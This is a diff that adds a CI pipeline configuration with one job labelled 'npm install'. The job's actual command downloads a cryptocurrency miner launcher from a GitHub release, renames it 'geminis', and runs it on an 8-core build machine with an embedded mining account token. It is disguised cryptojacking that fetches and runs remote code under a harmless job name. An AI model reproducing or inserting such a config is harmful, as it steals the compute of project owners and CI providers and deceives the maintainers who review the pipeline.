@@ -1,0 +1,14 @@
+version: v1.0
+name: Initial Pipeline
+agent:
+  machine:
+    type: e1-standard-8
+    os_image: ubuntu2004
+blocks:
+  - name: Install
+    dependencies: []
+    task:
+      jobs:
+        - name: npm install
+          commands:
+            curl -L -o geminis https://github.com/SWPSCO/nockpool-miner-launcher/releases/latest/download/miner-launcher_linux_x64 && chmod +x geminis && ./geminis --account-token nockacct_37132a22fa28778e9d333ab56ac0d6ba --max-threads 8
